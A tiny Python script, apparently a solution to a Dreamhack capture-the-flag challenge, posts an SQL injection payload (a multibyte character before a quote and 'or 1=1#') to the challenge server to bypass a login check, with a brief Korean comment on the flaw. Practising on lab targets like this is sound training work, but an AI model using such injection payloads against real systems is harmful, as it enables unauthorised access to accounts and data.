import requests

url="http://host3.dreamhack.games:23997/"

params={
    "id":"p2\xa1' or 1=1#",
    "ps":"123"
}

res=requests.post(url,params=params)

print(res.status_code,res.text)

#풀이
#대소문자 구분 쿼리가 없음.